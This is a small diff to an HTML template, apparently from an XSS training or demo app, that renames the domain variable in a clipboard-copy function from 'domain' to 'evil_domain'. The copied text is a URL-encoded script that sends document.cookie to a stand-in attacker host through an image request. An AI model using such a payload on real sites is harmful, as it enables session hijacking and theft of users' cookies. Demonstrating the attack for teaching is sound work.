@@ -7,7 +7,7 @@
 
     <script>
         function addToClipboard() {
-        var copyText = "%3Cscript%3E%20%0Adocument.write('%3Cimg%20src=%22{{ domain }}evilimage?get='+escape(document.cookie)+'%22%3E');%0A%3C/script%3E";
+        var copyText = "%3Cscript%3E%20%0Adocument.write('%3Cimg%20src=%22{{ evil_domain }}evilimage?get='+escape(document.cookie)+'%22%3E');%0A%3C/script%3E";
         navigator.clipboard.writeText(decodeURI(copyText));
         } 
     </script>
